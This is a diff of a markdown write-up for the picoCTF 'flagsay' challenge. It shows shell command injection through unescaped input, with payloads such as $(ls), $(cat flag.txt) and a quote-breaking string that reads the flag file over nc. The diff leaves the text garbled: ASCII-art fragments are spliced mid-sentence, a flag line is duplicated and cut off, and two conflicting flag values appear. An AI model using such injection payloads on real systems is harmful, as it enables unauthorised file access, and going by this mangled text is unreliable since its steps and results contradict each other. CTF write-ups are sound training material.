@@ -17,32 +17,46 @@ Another simple 1, looking at the source code reveals that whatever is inputted b
 
 Testing the program with random input,
 
-	$ nc shell2017.picoctf.com 12442
+	However, input is unescaped, so we can pass on a shell command like
+
+    $ nc shell2017.picoctf.com 12442
 	"aaa"
-	               _                                        
-	              //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~     
-	             //aaa                              /     
-	            //                                   /      
-	           //                                   /       
-	          //                                   /        
-	         //                                   /         
-	        //                                   /          
-	       //___________________________________/           
-	      //                                                
-	     //                                                 
+	51865
+    $(ls)
+                   _                                        
+	                  //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~     
+	                 //aaa  flagsay-1
+    flagsay-1_no_aslr
+    flag.txt
+    xinetd_wrapper.sh                              /     
+	                //                                   /      
+	               //                                   /       
+	              //                                   /        
+	             //                                   /         
+	            //                                   /          
+	           //___________________________________/           
+	          //                                                
+	         //                                                 
 	    //                                                  
 	   //                                                   
 	  //                                                    
 	 //                                                     
 
 We can see that input gets inside of the flag.
-However, input is unescaped, so we can pass on a shell command like 
+However, input is unescaped, so we can pass on a shell command        //                                                  
+       //                                                   
+      //                                                    
+     //
+
+Then, we can do something like this
 
      $ nc shell2017.picoctf.com 12442
 	aaaa"
-	               _                                        
-	              //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~     
-	             //aaaa /
+	51865
+    $(cat flag.txt)
+                   _                                        
+	                  //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~     
+	                 //aaaa /
 	sh: 4: //: Permission denied
 	sh: 5: //: Permission denied
 	sh: 6: //: Permission denied
@@ -62,9 +76,13 @@ As seen above, `"` at the end of the input breaks the code. Also, we can see the
 Then, we can do something like this to break the first line with characters and the command for the second line, gives the flag
 
     $ nc shell2017.picoctf.com 12442
-	aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"bin/cat flag.txt
-               _                                        
-              //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~     
+	aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"bin/cat flag.txt2ab2050bf32e84975a10d774a919e1d0                    /     
+                //                                   /      
+               //                                   /       
+              //                                   /        
+               _     //                                   
+  /         
+            //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~     
              //aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa/
 	6116b5c621137949e3f70fd31f7cc29a
 	//bin/cat: /: Is a directory
@@ -81,7 +99,16 @@ Then, we can do something like this to break the first line with characters and 
 	sh: 15: //: Permission denied
 	sh: 17: Syntax error: Unterminated quoted string
 
-Therefore, the flag is `6116b5c621137949e3f70fd31f7cc29a`.
+Therefore, the flag is `6116b5c621137949e3f70fd31f7cc29a                                   /          
+           //___________________________________/           
+          //                                                
+         //                                                 
+        //                                                  
+       //                                                   
+      //                                                    
+     // 
+
+Therefore, the flag is `2ab2050bf32e84975a10d774a919e1d0`.
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbNDY1MDc3MDQzXX0=
+eyJoaXN0b3J5IjpbLTM4NDU2MTYwMCw0NjUwNzcwNDNdfQ==
 -->
